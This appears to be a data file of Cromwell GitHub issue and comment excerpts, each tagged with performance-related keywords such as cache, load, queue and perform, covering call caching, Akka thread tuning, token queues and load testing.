Performance,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:915,cache,cache,915,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592,1,['cache'],['cache']
Performance,"Find - or implement - and then document a good answer to the question ""my job has been running for longer than it should. Is everything ok?"" . Bonus points if this solution could one day (maybe not today, maybe not tomorrow, but one day...) become a ""self-help"" button in Terra. Possible reasons for this we know about:. * You're still waiting for an execution token; * Call caching reading took (or is taking) a long time; * Your job was queued in PAPI for hours; * Your job got stuck in PAPI while running",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4986:439,queue,queued,439,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4986,1,['queue'],['queued']
Performance,"Find a way to perform FinalCalls as functions with a WorkflowActor State . WorkflowActor uses some state to run various final file copies: ; - Possibly use the existing Finalizing state; - Possibly create another state that means the workflow is in this phase of running this specific group operations. If the process dies during this state, upon restart, the workflow would retry copying all of the files, meaning the final actions: ; - Do not need to be a CallKey or other JobKey/ExecutionStoreKey; - Do not need to be tracked in the WorkflowActor ExecutionStore; - Do not need to be individually tracked with state in the database’s Execution table; - Will possibly use more IO than strictly necessary on restart, as we don’t know what copies succeeded and what failed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/773:14,perform,perform,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/773,1,['perform'],['perform']
Performance,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:169,load,load,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102,3,"['load', 'tune']","['load', 'tune']"
Performance,"First test (@dtenenba built the PR 4412 and I tested it):. Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; First input json: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-parameters.json; Second input json: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-batchofOne.json. and... drumroll please...... IT WORKED!!!!!!!!!!! ; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": true,; ""result"": ""Cache Hit: 98bc2232-f147-419f-9351-49a07daa1720:Panel_BWA_GATK4_Samtools_Var_Annotate_Split.SamToFastq:0"",; ```; And the workflow is ""generating"" the files WAY faster than it should be if it were doing it de novo, so we seem to be getting the correct outputs moved into the new workflow directory as well. . Caveats: ; I did test it with an actual batch and it failed with the job definition error. But as long as PR 4412 was not intended to fix THAT issue as well, I can say it appears on the first pass that call caching with AWS backend might very well be working with an outside test!!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-480313623:656,Cache,Cache,656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-480313623,1,['Cache'],['Cache']
Performance,Fix TES backend to load preemptible setting from configuration [BA-6004],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5270:19,load,load,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5270,1,['load'],['load']
Performance,Fix TES backend to load preemptible setting from configuration [BA-6004] [CI clone],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5314:19,load,load,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5314,1,['load'],['load']
Performance,Fix bug discovered in load testing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/411:22,load,load,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/411,1,['load'],['load']
Performance,Fix call cache checks in case of cache invalidation [CROM-6603],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6072:9,cache,cache,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072,2,['cache'],['cache']
Performance,Fix call cache checks in case of cache invalidation w/ test [CROM-6603],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6725:9,cache,cache,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6725,2,['cache'],['cache']
Performance,Fix invalidation of bad caches. Fixes #1929,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1931:24,cache,caches,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1931,1,['cache'],['caches']
Performance,Fixed `programmer error` messages related to race conditions in RootWorkflowFileHashCacheActor [BA-6503],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5580:45,race condition,race conditions,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5580,1,['race condition'],['race conditions']
Performance,"Fixed the [proof of concept code](https://github.com/broadinstitute/cromwell/compare/develop...rhpvorderman:relativeImports). Now the WOMTOOL is able to handle absolute paths correctly. I can run `java -jar /home/ruben/test/base/womtool-31-1df94fa-SNAP.jar validate /home/ruben/test/base/workflow.wdl ` in any directory on the filesystem and get the same result. However cromwell still uses $PWD to evaluate the base directory. I can see the WOMtool uses the following code to load the WDL file:; ```scala; private[this] def loadWdl(path: String)(f: WdlNamespace => Termination): Termination = {; WdlNamespace.loadUsingPath(Paths.get(path), None, None) match {; case Success(namespace) => f(namespace); case Failure(r: RuntimeException) => throw new RuntimeException(""Unexpected failure mode"", r); case Failure(t) => UnsuccessfulTermination(t.getMessage); }; }; ```; But for cromwell there does not seem to be such a straightforward loading of the wdlfile. Can somebody point me to this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047:477,load,load,477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047,4,['load'],"['load', 'loadUsingPath', 'loadWdl', 'loading']"
Performance,"Fixed! Question: I have a compute-environment, job-queue, and job-definition already set up, and it appears they were used. What would happen if I didn't have any of that set up in AWS Batch already? I don't feel like re-creating right now to test, but just wondering... Also, I see you opened an issue to add volume support. You could check out the work done by the Funnel team and [https://github.com/adamstruck/ebsmount/tree/master/resources/funnel](url)...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395510754:51,queue,queue,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395510754,1,['queue'],['queue']
Performance,Fixing a few bugs in the end-to-end performance comparison scripts.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5825:36,perform,performance,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5825,1,['perform'],['performance']
Performance,Flakey test: LoadControllerServiceActorSpec,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4237:13,Load,LoadControllerServiceActorSpec,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4237,1,['Load'],['LoadControllerServiceActorSpec']
Performance,"Follow up on https://github.com/broadinstitute/cromwell/pull/4112. This will reduce the load on the JVM a lot. I did indeed a stress test on our system with 50.000 async qsub/qstat jobs but this was outside the jvm. Inside the jvm this ends up in blocking threads to cromwell. When the timeout is set to 120 seconds, `isAlive` will only run once each 120 seconds.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220:88,load,load,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220,1,['load'],['load']
Performance,"For any table where there are update queries made (not insert) where the rows represent extra-workflow information, make sure that the table is locked when those updates are happening. Examples of such a table would be the workflow store or call cache stuff. . A counterexample would be the metadata table, which is insert-only",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3342:246,cache,cache,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3342,1,['cache'],['cache']
Performance,"For example, we can see how long we spend checking the call cache, copying results, etc, for each call.; Before:; <img width=""619"" alt=""screen shot 2016-09-21 at 11 21 49 am"" src=""https://cloud.githubusercontent.com/assets/13006282/18717366/a9c6cf10-7fed-11e6-9075-18eef4fc4871.png"">. After:; <img width=""978"" alt=""screen shot 2016-09-21 at 11 19 18 am"" src=""https://cloud.githubusercontent.com/assets/13006282/18717376/b2dbbbb0-7fed-11e6-8ac2-69445de55ed3.png"">",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1458:60,cache,cache,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1458,1,['cache'],['cache']
Performance,"For further clarification. There are two `exec` statements in the config. The `exec` statement **before** the submit command will execute a simple echo command. If singularity notices the image is not there it will pull it to `SINGULARITY_CACHEDIR`. ; Then the job is submitted and the `exec` statement **in** the submit command is executed. If `SINGULARITY_CACHEDIR` is on a shared filesystem the image will already be present. The image will *not* be pulled by the execution node and the job executes right away. Using `exec` instead of `pull` means that Singularity will decide where the image goes, and not the user. This is quite useful as Singularity has all the functionality to make a functional image cache already built-in. This way we don't have to hack it together in bash, which is always the less preferable option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541:710,cache,cache,710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541,2,['cache'],['cache']
Performance,"For instance, someone used ""docker.io/<their image>"" path in their runtime block and this led to a failure to call cache since call caching doesn't support docker.io urls. . Right now, since this failed to call cache it reran the job, however this was due to user error and they assumed caching would work. Additionally, there are cases such as when there's a failure to communicate with dockerhub that would also lead to failure to call cache. This request is for a workflow option that worked in conjunction with read_from_cache that set this behavior more strictly - if there is call cache miss, then run a new job, but if there is any other type of failure to call cache (transient, bad url, etc) then fail the job for the reason that the user requested to call cache and call caching failed to determine caching correctly.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2787:115,cache,cache,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2787,6,['cache'],['cache']
Performance,"For some reason Cromwell now makes jars for every subproject every time the `run` command is issued:. ```; computer:cromwell me$ sbt ""project server"" ""run server""; [info] Loading settings from plugins.sbt,swagger2markup.sbt ...; [info] Loading project definition from /Users/me/gitrepos/cromwell/project; [info] Loading settings from build.sbt ...; [info] Resolving key references (31064 settings) ...; [info] Set current project to root (in build file:/Users/me/gitrepos/cromwell/); [info] Set current project to cromwell (in build file:/Users/me/gitrepos/cromwell/); [info] Packaging /Users/me/gitrepos/cromwell/database/sql/target/scala-2.12/cromwell-database-sql_2.12-32-92c91d9-SNAP.jar ...; [info] Packaging /Users/me/gitrepos/cromwell/cromwellApiClient/target/scala-2.12/cromwell-api-client_2.12-32-92c91d9-SNAP.jar ...; [info] Done packaging.; [info] Packaging /Users/me/gitrepos/cromwell/common/target/scala-2.12/cromwell-common_2.12-32-92c91d9-SNAP.jar ...; ...; ```. This certainly isn't making the run launch any faster and clutters up the build directory with jars that makes it tough to find the Centaur CWL runner and Cromwell server jars needed for conformance testing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3624:171,Load,Loading,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3624,3,['Load'],['Loading']
Performance,"For the following task ; ```; task star_index {. File genomeDir; File genomeFasta; Int threads; Int binBits; Int max_memory = 100000000000. command {; /usr/local/bin/STAR \; --runThreadN ${threads} \; --runMode genomeGenerate \; --genomeDir ${genomeDir} \; --genomeFastaFiles ${genomeFasta} \; --genomeChrBinNbits ${binBits} \; --limitGenomeGenerateRAM=${max_memory}; }. runtime {; docker: ""quay.io/biocontainers/star@sha256:352f627075e436016ea2c38733b5c0096bb841e2fadcbbd3d4ae8daf03ccdf1b""; }. output {; File out = genomeDir; }. }; ```; I get ; ```; ""Unable to load namespace from workflow: For input string: \""100000000000\""""; ```; error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2744:562,load,load,562,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2744,1,['load'],['load']
Performance,"For the second point, it's already possible, setting the cache-size to 0 will disable the cache here:; https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L150",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-284004128:57,cache,cache-size,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-284004128,2,['cache'],"['cache', 'cache-size']"
Performance,"For this particular case it might be an optimization, but from a general perspective I think it can be a design choice and would avoid creating new Workflow Actors-like",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266:40,optimiz,optimization,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266,1,['optimiz'],['optimization']
Performance,Format of docker-image-cache-manifest-file?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6953:23,cache,cache-manifest-file,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953,1,['cache'],['cache-manifest-file']
Performance,"Found the forum entry looking for a solution for mounting a docker volumen. In my case I would like to run Ensembl VEP with Cromwell/WDL. Using VEP in cache/offline mode has many advantages, among them much better performance. When running VEP in cache mode it is necessary to have a large set of files locally installed. Downloading these files using the provided INSTALL.pl will be very inefficient. I plan for now to tar everything together and download and untar from a google bucket every time I run the task. However, it would be much better if I could mount a docker volume to the container running the task. The way I see it I would be able to define an snapshot in the runtime section of the task definition. I would also be able to define the mount point (docker run -v *:{mount point}) where this snapshot would be available as a docker volume. In the background Cromwell would provision a disk using the snapshot, mount it to the VM and use the correct `docker run -v /path/to/disk:/requested/mount/point` docker run command. Hope this helps defining this issue. Thanks for considering raising the priority of this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-334726349:151,cache,cache,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-334726349,3,"['cache', 'perform']","['cache', 'performance']"
Performance,"From @droazen . Alright, the commit to use to build the jar to run GenomicsDBImport (using the instructions above) is: d4d97fcbb59efd9acbf8fabca7361b59512755bb. The tool is passing integration tests at this point, and it is completely worth your while to profile the current version and see how it compares to the SelectVariants approach. It's worth mentioning that in the next week or so we will add one additional argument to the tool which might further help performance. You can track the status of this here: https://github.com/broadinstitute/gatk/issues/2613. Hand-off complete -- have a good weekend everyone!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296326007:462,perform,performance,462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296326007,1,['perform'],['performance']
Performance,"From @yfarjoun . > I've been playing around with some wdl on the methods cromwell that has caching turned on. I have some results I do not understand. I modified the bwa step in a small way for input that has already run all the way to HaplotypeCaller. Re-running that wdl shows that the upstream steps are fast (as expected), the BWA step is re-done (again, as expected), but the downstream steps have been used from cache...this seems wrong to me, after all, if the BWA has been re-run, all the downstream steps need to be re-run as well...could you explain what's going on?. For example, the ""PairedEndSingleSampleWorkflow.MergeBamAlignment"" step should have been recomputed as it is downstream of the BWA step. Here's a [timing diagram](https://cromwell.dsde-; methods.broadinstitute.org/api/workflows/v1/d69172b2-3b5d-44b3-aaec-5ed12dbb771f/timing) and [metadata](https://cromwell.dsde-; methods.broadinstitute.org/api/workflows/v1/d69172b2-3b5d-44b3-aaec-5ed12dbb771f/metadata): . metadata also attached here. Although we don't have call caching in 0.20+ we should understand this problem (or clarify why it's not a problem) so that we don't replicate the bug (if that's what it is)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1150:418,cache,cache,418,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1150,1,['cache'],['cache']
Performance,"From Gitter:; > we're submitting jobs via API to remote cromwell server, and want to submit workflows with all the imports resolved already (client-side) so that querying cromwell metadata submittedFiles.workflow value shows verbatim what's being executed. Is there a way in wdl4s for example to do something effectively like: `val ns = NamespaceWithWorkflow.load(myWorkflow, myResolver); val wfAsString = ns.toWdlSource` i.e. get the string representation of the workflow back again, but with the imports resolved (""expanded"")?. @cjllanwarne your gist is no longer available, do you remember what you wrote?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2691#issuecomment-335849494:359,load,load,359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2691#issuecomment-335849494,1,['load'],['load']
Performance,"From Henry --. My comment is a little different than the commenter above. So I will try to provide some context in order to differentiate. If one looks at Cromwell as being part of a larger application infrastructure/service such as a Genomics Pipeline where sequenced data is constantly being processed through the system or providing a service where users on the Internet can launch workflows ""as a Service"" - whenever they way. In these systems, uptime and availability are critical - at all times. Below are several scenarios where I could see running multiple Cromwells would be very beneficial. High availability:; Having multiple Cromwells running where jobs are ""load balanced"" between them would allow us to continue operate when there are systems issues or failures with one of the Cromwell instances. Zero-downtime deployments:; Supporting multiple Cromwells running different versions of the code, could provide the ability to upgrade Cromwell with little or no user impact. Essentially the new version is deployed to a new server, it is started up and at an appropriate time traffic (via a load balancer or proxy maybe) is directed away from the ""old version"" Cromwell to the new. Similar to item 2: being able to introduce infrastructure changes (host OS, security patches, host resizing,..) more seamlessly:; If I can support multiple instances of Cromwell, I can build a new instance of the host with all the updates and changes I require - deploy cromwell to the new node and cut over. A corollary to this request is also the ability to ""move"" workflows from one Cromwell instance to another. Maybe this is just workflows not in flight or active - but waiting to run. This capability could make it easier to retire older cromwell instances (once multiple cromwell instances support is in place). Some workflows may take days to run, being able to ""relocate"" these workflows to the ""new"" cromwell - allows us to decommission ""old"" cromwells faster.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/691:671,load,load,671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/691,2,['load'],['load']
Performance,"From both swagger & purely from command line verify that the following workflow (pardon the pun) works. If it does not, file tickets here or with Sam as appropriate. Create a doc detailing the outcome. - Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - Register user in Sam; - Submit workflow to Cromwell; - Get final results from Cromwell for that workflow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598:204,Perform,Perform,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598,1,['Perform'],['Perform']
Performance,From investigation of https://broadinstitute.atlassian.net/browse/DSDEEPB-2736. We decided to have these values in the configuration but to keep them commented out so GotC can optionally tune these.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/442:187,tune,tune,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/442,1,['tune'],['tune']
Performance,"From looking at the behaviour of cromwell, I think it traverses the execution graph (is that what it's called, the order in which tasks are run?) breadth-first, (e.g. first perform trimming for all samples, then mapping for all samples, then genotyping, etc). For most workflows, different tasks will have different performance characteristics (trimming and mapping is read/write heavy, genotyping is mostly read/CPU intensive). Would it then not make sense to do a depth first traversal of the execution graph? That way, we will have the most diversity in performance characteristics for all running tasks, which should speed up the overall runtime (e.g. no fighting over harddisk time between two trimming tasks). As a secondary bonus, depth first will mean that all different tasks are run as soon as possible, so when there is an error in one of the later tasks this is revealed to the user much more quickly.; The drawback is that cromwell will then also stop running the early tasks that do not give an error, but IIRC that behaviour is configurable in the settings file.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2736:173,perform,perform,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2736,3,['perform'],"['perform', 'performance']"
Performance,From the [GDoc](https://docs.google.com/document/d/1mHbgzS7UlodljgV8JVk3QWHMqXn8kZNu-x8jFql7vX0/edit?usp=sharing):. > Should we consider doing a lookup of call cache outputs pertaining to the user running the workflow first; We don’t have a way of tracking users; Find other outputs with same outputs?; Consider creating a general concept of an account? Analogous to service account but not GCP-specific,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3510:160,cache,cache,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3510,1,['cache'],['cache']
Performance,"From user reports, this is upsetting cost estimation (and is scary anyway wrt re-writing history!. Needs validation and a reproducible case, but presumably something like:. - Run a long workflow, one shard fails; - Re-run the same workflow, most shard call cache; - The shards in the original workflow get updated to have the call-cache timings, rather than the original long timings.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4141:257,cache,cache,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4141,2,['cache'],['cache']
Performance,"Fully caches Genome in a Bottle chm to run in ~2 hours. Still waiting on results from GIAB Joint because that takes much longer and has to be restarted for sporadic failures, but all the calls so far will cache.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3541:6,cache,caches,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3541,2,['cache'],"['cache', 'caches']"
Performance,Functionality added to localize WdlFile / WdlArray[WdlFile] cached results in HtCondor so in that way cached results are link to the new task. i.e.:; 1. w0/task1 execution produces w0/result1.; 2. w0/result1 is stored in the cache.; 3. w1/task1 (w1/task1 is the same as w0/task1) is executed again.; 4. Cache result is hit.; 5. File cached results are used to generate new symlinks to point to them in current task.; 6. Result is generated using new paths based on symlinks and/or other cached results. This change is based on new security/permissions requirements.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1424:60,cache,cached,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1424,6,"['Cache', 'cache']","['Cache', 'cache', 'cached']"
Performance,Gave up trying to combat the performance vs memory tradeoff (which seems unlikely to be winnable anyways) and the relatively simple solution works. We can have the metadata write batch size be a config option and tell users that setting the number lower uses less memory but drops performance under higher load and vice versa,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855:29,perform,performance,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855,6,"['load', 'perform']","['load', 'performance']"
Performance,"Glad that helped !; Regarding HSQL vs MySQL, the main reason is that we've rarely used HSQL and there may be some corner cases that we don't support (and don't know about); It probably performs better too on the long run as your DB grows.; But it's definitely good to have some feedback on how Cromwell behaves with HSQL too.; For the `null` hash, something weird is going on so I'd keep the issue open. If it's not immediately blocking you anymore it might get slightly de-prioritized but we'll definitely look into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970:185,perform,performs,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970,2,['perform'],['performs']
Performance,Goal: Run a 20K Wide Scatter with 1800 Files created in each job and be able to call cache it.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1536:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1536,1,['cache'],['cache']
Performance,"Good news? This would also band-aid the jobs-never-running problem reported last week. From the token logs: . 6:22 PM :; ```; ""queue"" : {; ""groupsNeedingTokens"" : [; {; ""hogGroup"" : ""porcine-project"",; ""size"" : 3367; }; ],; ...; ""poolState"" : {; ""hogGroups"" : [; {; ""hogGroup"" : ""porcine-project"",; ""used"" : 3947,; ""atLimit"" : true; },; ...; ```. At 6:26 PM the `JobExecutionTokenDispenserActor` crashed with a stack trace similar to the one in this PR description. 6:27 PM:. ```; ""tokenTypes"" : [; ""queue"" : {; ""groupsNeedingTokens"" : [; {; ""hogGroup"" : ""porcine-project"",; ""size"" : 5; }; ],; ...; ""poolState"" : {; ""hogGroups"" : [; {; ""hogGroup"" : ""porcine-project"",; ""used"" : 16,; ""atLimit"" : false; }; ],; ...; ```. So the crash of the `JobExecutionTokenDispenserActor` not only lost the token assignments, but also the hog queues. The loss of token assignments leads to the fairly harmless condition of Cromwell handing out more tokens than it actually should (though emitting thousands of scary log messages in the process). But the loss of the hog queues means that the 3367 jobs that needed tokens at 6:22 PM would never receive them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488007667:127,queue,queue,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488007667,4,['queue'],"['queue', 'queues']"
Performance,"Good point - that is the load on cromwell server itself; default backend is PBS (very like SGE) but some of the simple tasks in the workflow (`mkdir`, `uuidgen`) specify `backend: ""Local""` in the WDL `runtime` block.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284748023:25,load,load,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284748023,2,['load'],['load']
Performance,"Got a centaur failure with `Failed to upload auth file` caused by the following exception, not considered retryable:. ```; 017-04-18 21:11:49,413 cromwell-system-akka.dispatchers.engine-dispatcher-64 ERROR - WorkflowManagerActor Workflow 6e23463e-3fc6-4b18-aeb0-fc7c920cd758 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:63); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:62); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageExc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:665,concurren,concurrent,665,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,3,['concurren'],['concurrent']
